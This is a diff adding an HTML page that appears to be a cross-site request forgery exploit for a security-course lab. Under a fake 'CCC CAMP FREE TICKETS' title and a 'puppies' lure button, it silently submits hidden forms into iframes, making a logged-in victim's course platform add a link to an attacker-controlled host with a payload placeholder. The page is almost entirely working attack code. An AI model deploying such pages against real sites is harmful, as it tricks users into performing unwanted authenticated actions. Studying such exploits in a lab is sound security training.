@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CCC CAMP FREE TICKETS</title>
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <style>
+    #main-wrapper {
+      width: 960px;
+    }
+  </style>
+</head>
+<body>
+  <div id="main-wrapper">
+    <input type="button" value="CLICK AND FIND OUT MORE PUPPIES" onclick="submitForms()" class="button">
+    <iframe name="frame-me" id="frame-me"></iframe>
+    <form action="http://sloppy-clowns-0.csec.chatzi.org/modules/course_tools/course_tools.php?submit=yes&action=2" method="post" id="form1" target="frame-me">
+        <input type="hidden" id="link" name="link" value="http://melenetzon.puppies.chatzi.org/<PAYLOAD>"><br>
+        <input type="hidden" id="name_link" name="name_link" value="TOO MANY PUPPIES"><br>
+      </form>
+    <iframe name="frame-you" id="frame-you"></iframe>
+    <form action="http://sloppy-clowns-0.csec.chatzi.org/courses/TMB100/" method="get" target="frame-you" id="form2"></form>
+  </div>
+  <script>
+    function submitForms() {
+      document.getElementById("form2").submit();
+      setTimeout(() => {  document.getElementById("form1").submit(); }, 400);
+    }
+  </script>
+</body>
+</html>
